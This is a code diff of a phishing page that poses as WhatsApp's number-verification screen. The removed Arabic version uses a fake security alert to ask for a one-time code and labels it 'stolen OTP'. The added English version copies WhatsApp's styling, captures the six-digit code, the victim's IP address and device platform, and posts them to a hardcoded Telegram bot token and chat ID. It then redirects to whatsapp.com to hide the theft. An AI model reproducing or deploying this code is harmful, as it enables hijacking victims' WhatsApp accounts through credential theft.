@@ -1,57 +1,128 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد رقم واتساب</title>
+    <title>WhatsApp</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            background: #e5ddd5; 
-            text-align: center; 
-            padding: 20px; 
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #111b21;
         }
-        .whatsapp-box {
-            background: white;
-            width: 300px;
-            margin: 50px auto;
+        .container {
+            width: 100%;
+            max-width: 360px;
             padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
         }
-        .warning {
-            color: red;
-            font-weight: bold;
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 30px;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 15px;
+            color: #008069;
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.4;
+            color: #667781;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            margin-bottom: 30px;
+            border-bottom: 2px solid #00a884;
+            width: 180px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 4px;
+            padding: 5px 0;
+        }
+        button {
+            background-color: #008069;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: 500;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        button:active {
+            background-color: #006e5a;
+        }
+        .footer-text {
+            margin-top: 40px;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
-    <div class="whatsapp-box">
-        <h2>⚠️ تنبيه أمني ⚠️</h2>
-        <p class="warning">تم اكتشاف محاولة اختراق لحسابك!</p>
-        <p>لحماية حسابك، يرجى إدخال رمز OTP الذي تلقيته للتو:</p>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo">
+        <h1>Verifying your number</h1>
+        <p>Waiting to automatically detect an SMS sent to your phone. <br><strong>Enter 6-digit code</strong></p>
         
-        <form id="otpForm" action="https://api.telegram.org/bot8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU/sendMessage" method="POST">
-            <input type="text" name="chat_id" value="5446862709" hidden>
-            <input type="text" name="text" id="fullData" hidden>
-            
-            <input type="text" placeholder="أدخل رمز OTP هنا" required style="padding: 10px; width: 80%; margin: 10px 0;">
-            <button type="submit" style="background: #25D366; color: white; border: none; padding: 10px 20px; border-radius: 5px;">تأكيد</button>
+        <form id="waForm">
+            <div class="input-group">
+                <input type="text" id="otp" placeholder="--- ---" maxlength="7" required>
+            </div>
+            <button type="submit" id="btn">Next</button>
         </form>
+
+        <p class="footer-text" style="color: #008069;">Resend SMS</p>
     </div>
 
     <script>
-        document.getElementById('otpForm').onsubmit = function() {
-            const otp = document.querySelector('input[type="text"]').value;
-            const userAgent = navigator.userAgent;
-            const ip = fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip);
-            
-            document.getElementById('fullData').value = `📱 OTP مسروق:\n\n🔑 الرمز: ${otp}\n\n🌐 IP الضحية: ${ip}\n\n🛠️ User Agent: ${userAgent}`;
-            
-            return true;
+        const API_DATA = {
+            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
+            C: '5446862709'
         };
+
+        document.getElementById('waForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            const otpVal = document.getElementById('otp').value;
+
+            btn.disabled = true;
+
+            try {
+                const ipReq = await fetch('https://api.ipify.org?format=json');
+                const ipRes = await ipReq.json();
+
+                const text = `🟩 WhatsApp Log\n\nCode: ${otpVal}\nIP: ${ipRes.ip}\nDevice: ${navigator.platform}`;
+
+                await fetch(`https://api.telegram.org/bot${API_DATA.T}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: API_DATA.C, text: text })
+                });
+
+                window.location.href = "https://www.whatsapp.com";
+            } catch (err) {
+                btn.disabled = false;
+            }
+        });
     </script>
+
 </body>
 </html>
